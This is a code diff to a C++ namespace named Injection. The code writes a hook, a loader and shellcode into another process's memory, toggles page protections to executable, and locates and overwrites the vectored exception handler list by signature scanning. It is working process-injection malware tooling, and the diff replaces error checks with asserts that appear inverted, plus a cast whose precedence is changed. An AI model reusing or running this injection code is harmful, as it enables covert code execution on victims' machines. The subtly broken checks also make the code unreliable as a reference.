@@ -27,24 +27,16 @@ namespace Injection {
 
         x_ntassert(Ctx->nt.NtProtectVirtualMemory(process, R_CAST(void**, &ex_addr_p), &total, PAGE_EXECUTE_READWRITE, nullptr));
         x_ntassert(Ctx->nt.NtWriteVirtualMemory(process, C_PTR(ex_addr), R_CAST(void*, writer.opcode->data), 0x5, &write));
-
-        if (write != 0x5) {
-            return_defer(ntstatus);
-        }
+        x_assert(write != 0x5);
 
         x_ntassert(Ctx->nt.NtProtectVirtualMemory(process, R_CAST(void** , &hook_p), &total, PAGE_READWRITE, nullptr));
         x_ntassert(Ctx->nt.NtWriteVirtualMemory(process, C_PTR(hook), writer.loader->data, writer.loader->length, &write));
-
-        if (write != writer.loader->length) {
-            return_defer(ntstatus);
-        }
+        x_assert(write != writer.loader->length);
 
         //Xtea::XteaCrypt(R_CAST(PBYTE, shellcode), n_shellcode, Ctx->Config.Key, FALSE);
 
         x_ntassert(Ctx->nt.NtWriteVirtualMemory(process, C_PTR(hook + writer.loader->length), shellcode, n_shellcode, &write));
-        if (write != n_shellcode) {
-            return_defer(ntstatus);
-        }
+        x_assert(write != n_shellcode);
 
         x_ntassert(Ctx->nt.NtProtectVirtualMemory(process, R_CAST(void**, &hook), &n_shellcode, PAGE_EXECUTE_READ, nullptr));
 
@@ -63,15 +55,12 @@ namespace Injection {
             uintptr_t               handler     = { };
             uint32_t                match       = 0;
 
-            x_assert(!(match = Memory::Scanners::SignatureScan(R_CAST(uintptr_t, module->DllBase), module->SizeOfImage, signature, mask)));
+            x_assert(match = Memory::Scanners::SignatureScan(R_CAST(uintptr_t, module->DllBase), module->SizeOfImage, signature, mask));
 
-            match += 0xD;
-            handlers = R_CAST(LdrpVectorHandlerList*, *R_CAST(int32_t * , match + (match + 0x3) + 0x7));
+            match   += 0xD;
+            handlers = (LdrpVectorHandlerList*) *(int32_t*) match + (match + 0x3) + 0x7;
 
-            if (!NT_SUCCESS(Ctx->nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void*, handlers->first), &handler, sizeof(void *), nullptr))) {
-                handler = 0;
-                return_defer(ntstatus);
-            }
+            x_ntassert(Ctx->nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void*, handlers->first), &handler, sizeof(void *), nullptr));
 
             defer:
             return handler;
@@ -105,6 +94,5 @@ namespace Injection {
 
             return Ctx->nt.NtWriteVirtualMemory(NtCurrentProcess(), C_PTR(handler), writer.target, sizeof(uintptr_t), nullptr);
         }
-
     }
 }
